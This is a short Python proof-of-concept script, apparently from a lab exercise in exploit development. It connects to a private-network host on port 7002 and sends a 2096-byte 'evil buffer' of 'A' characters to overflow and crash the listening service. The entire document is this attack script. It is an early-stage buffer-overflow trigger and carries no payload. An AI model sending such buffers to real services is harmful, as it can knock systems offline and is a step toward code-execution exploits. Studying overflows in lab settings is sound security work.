#!/usr/bin/python
import socket

try:
  print("\nSending evil buffer...")

  buffer = "A" * 0x830 # Decimal: 2096

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.193.10", 7002))
  s.send(buffer)
  
  s.close()

  print("\nDone!")
  
except:
  print("\nCould not connect!")